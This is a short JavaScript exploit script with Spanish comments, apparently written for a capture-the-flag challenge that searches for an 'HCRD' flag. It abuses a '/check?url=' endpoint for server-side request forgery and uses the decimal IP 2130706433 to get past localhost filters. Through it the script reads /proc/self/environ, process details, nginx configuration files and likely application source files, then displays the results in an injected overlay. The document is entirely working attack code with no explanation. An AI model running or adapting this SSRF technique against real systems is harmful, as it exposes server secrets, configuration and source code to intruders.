var results = document.createElement('div');
results.style = 'position:fixed;top:0;left:0;width:100%;height:100%;overflow:auto;background:black;color:lime;font-family:monospace;font-size:13px;padding:20px;z-index:9999';
document.body.appendChild(results);

function log(msg) { results.innerHTML += msg + '<br>'; }

// Leer archivos del sistema que revelan la estructura
var systemFiles = [
  // Ver procesos corriendo y sus rutas
  '/check?url=' + encodeURIComponent('http://2130706433/proc/self/cmdline'),
  '/check?url=' + encodeURIComponent('http://2130706433/proc/self/environ'),
  '/check?url=' + encodeURIComponent('http://2130706433/proc/self/cwd'),
  '/check?url=' + encodeURIComponent('http://2130706433/proc/self/exe'),
  // Ver configuracion de nginx (revela rutas reales)
  '/check?url=' + encodeURIComponent('http://2130706433/etc/nginx/nginx.conf'),
  '/check?url=' + encodeURIComponent('http://2130706433/etc/nginx/sites-enabled/default'),
  '/check?url=' + encodeURIComponent('http://2130706433/etc/nginx/conf.d/default.conf'),
  // Ver codigo fuente de la app
  '/check?url=' + encodeURIComponent('http://2130706433/app.py'),
  '/check?url=' + encodeURIComponent('http://2130706433/main.py'),
  '/check?url=' + encodeURIComponent('http://2130706433/server.py'),
];

log('=== Leyendo archivos del sistema ===<br>');

systemFiles.forEach(url => {
  fetch(url)
    .then(r => r.text())
    .then(d => {
      if(d.includes('HCRD')) {
        log('<span style="color:yellow;font-size:20px">🚩 FLAG: ' + d + '</span>');
        alert('FLAG ENCONTRADA: ' + d);
      } else if(!d.includes('404') && !d.includes('not allowed') && !d.includes('Connection refused')) {
        log('<span style="color:lime">✅ ' + url.split('http%3A%2F%2F2130706433')[1] + ':</span>');
        log('<span style="color:white">' + d.substring(0, 500) + '</span><br>');
      } else {
        log('<span style="color:gray">❌ ' + url.split('http%3A%2F%2F2130706433')[1] + '</span>');
      }
    });
});